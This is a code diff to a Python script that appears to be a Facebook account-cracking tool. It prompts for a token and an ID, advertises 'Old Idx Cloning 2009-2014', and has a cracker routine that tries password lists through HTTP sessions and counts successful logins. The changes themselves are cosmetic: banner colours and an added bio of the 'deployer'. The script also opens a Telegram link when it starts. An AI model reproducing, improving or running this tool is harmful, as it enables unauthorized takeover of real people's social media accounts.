@@ -1,42 +1,3 @@
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 import datetime
 
 now = datetime.date.today()
@@ -95,18 +56,27 @@ from rich.padding import Padding;import webbrowser;webbrowser.open('https://t.me
 
 
 # 
-def linex():print(Panel(f'''[bold Red]   
+def linex():print(Panel(f'''[bold Blue]   
 ██████╗ ███████╗██╗   ██╗██╗
 ██╔══██╗██╔════╝██║   ██║██║
 ██║  ██║█████╗  ██║   ██║██║
 ██║  ██║██╔══╝  ╚██╗ ██╔╝██║
 ██████╔╝███████╗ ╚████╔╝ ██║
 ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝
+
+
+Deployer Name ;Devi Onfire
+Facebook Account: Devi Onfire 🐻 ❤️‍🩹 
+Version:10.1
+Contery; Pakistan
+Gf ; No Gf 
+Blood Group; A+
+Facebook Work: Fyter /And Rule maker
 ''',style='''bold Red'''))
 linex()
-print(Panel(f'''[bold green1]    Enter Token ''',style='''bold magenta2'''))
+print(Panel(f'''[bold Yellow1]    Enter Token ''',style='''bold magenta2'''))
 token = input(f"  TOKEN  :")
-print(Panel(f'''[bold green1]   Enter Id ''',style='''bold magenta2'''))
+print(Panel(f'''[bold Red1]   Enter Id ''',style='''bold magenta2'''))
 ID = input(f"  ID  :")
 loop,ok=0,0
 class Devi:
@@ -116,7 +86,7 @@ class Devi:
  
        os.system("clear")
        linex()
-       print(Panel("[cyan bold][✓] 1 Old Idx Cloning 2009-2014  \n[red bold][✘] 2 ExīīT /Clear",style='''bold magenta2'''))
+       print(Panel("[cyan bold]1_ Old Idx Cloning 2009-2014  \n[red bold] 2_ ExīīT /Clear",style='''bold magenta2'''))
        self.frsc=input("\033[0;32m~>> chose : ")
        if self.frsc == "1":self.settings()
        else:pass
@@ -142,7 +112,7 @@ class Devi:
        linex();input("~>> Prees Enter To Exit ");exit()
     def cracker(self,uid,pas,tl):
        global loop,ok
-       sys.stdout.write("\r\r\033[0;91m~>> Devi Onfire~>> %s ~>> OK ~>> %s \r"%(loop,ok));sys.stdout.flush()
+       sys.stdout.write("\r\r\033[0;94m~>> Devi Onfire~>> %s ~>> OK ~>> %s \r"%(loop,ok));sys.stdout.flush()
        try:
           for ps in pas:
               with requests.Session() as session:
